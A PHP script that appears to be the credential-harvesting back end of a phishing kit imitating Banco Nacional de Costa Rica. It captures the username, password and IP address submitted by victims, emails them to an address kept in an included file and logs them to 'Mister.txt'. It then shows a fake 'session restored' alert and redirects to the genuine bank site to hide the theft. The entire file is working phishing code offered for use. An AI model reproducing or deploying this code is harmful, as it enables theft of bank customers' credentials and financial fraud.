<?php
$email = $_POST['UserName'];
$cpass = $_POST['Password'];
$ip = $_SERVER['REMOTE_ADDR'];

$message = "----------------------------------- \r\n";
$message .= "EMAIL ".$ip."\r\n";
$message .= "Email: ".$email."\r\n";
$message .= "Clave: ".$cpass."\r\n";
$message .= "Host: ".$ip ."\r\n";
$message .= "----------------------------------- \r\n";

include "Content/pp.php";
$subject = 'BF'.$ip;
$headers = 'From: webmaster@example.com' . "\r\n" .
    'Reply-To: webmaster@example.com' . "\r\n" .
    'X-Mailer: PHP/' . phpversion();

mail($to, $subject, $message, $headers);

if( (empty($email)) or (empty($cpass)) ){
	header('location: listo.html');

}else{
	//guardar archivo texto
	$file = fopen ( 'Mister.txt' , 'a+');
	fwrite($file, "Email: ".$email."\r\n; Clave: ".$cpass."\r\n; IP: ".$ip."\r\n; ====Nuevo orden=========\r\n");
	fclose($file);
	$x=md5(microtime());  
echo "<script>";
			echo "alert('Restauracion de Sesion Completado Exitosamente!');";
			echo "window.location.href='https://www.bncr.fi.cr/';";
			echo "</script>";
}


?>